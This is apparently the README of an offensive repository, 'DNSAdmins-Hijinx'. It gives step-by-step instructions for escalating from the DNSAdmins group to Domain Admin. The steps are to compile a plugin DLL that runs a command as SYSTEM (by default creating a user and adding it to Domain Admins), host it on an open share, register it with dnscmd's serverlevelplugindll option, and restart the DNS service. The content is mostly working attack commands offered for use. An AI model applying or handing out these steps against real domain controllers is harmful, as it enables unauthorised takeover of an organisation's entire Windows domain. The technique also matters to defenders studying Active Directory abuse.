# DNSAdmins-Hijinx
Everything you need to escalate your privileges from DNSAdmins to Domain Admin

Derived Entirely From: <br />
[Feature, not bug: DNSAdmin to DC compromise in one line](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83) <br />

I just wanted a repo I could access from anywhere and have a working dnscmd.exe and DLL I can quickly customize for my needs and compile.  Ultimately, I would like to recreate the RPC calls dnscmd.exe makes in PowerShell/.NET so I don't need to drop so many files on disk.

To use:

1. Open the project in Visual Studio, update the DnsPluginInitialize function of dnshijinx.cpp to execute whatever command you would like to run as SYSTEM on the domain controller and compile the project. (Current command creates a new user and adds them to the Domain Admins Group)
2. Copy the DLL to a place the DC can reach.  Easiest way to do this is to create a share and grant read access to the "Everyone" SID.
3. Copy the dnscmd folder to disk.  dnscmd.exe has a dependency in ./en-US/dnscmd.exe.mui that it needs to function.
4. With a user in the DNSAdmins group, run the following command (if it's the primary DNS, make sure you use IPs as you may have issues resolving hostnames):
```
dnscmd.exe <ip-of-dc> /config /serverlevelplugindll \\<ip-of-share>\path\to\dll
```
5. Restart the DNS service on the DC:
```
sc.exe \\<ip-of-dc> stop dns
sc.exe \\<ip-of-dc> start dns
```
6. Confirm whatever action you wished to run on the DC as SYSTEM has been performed.
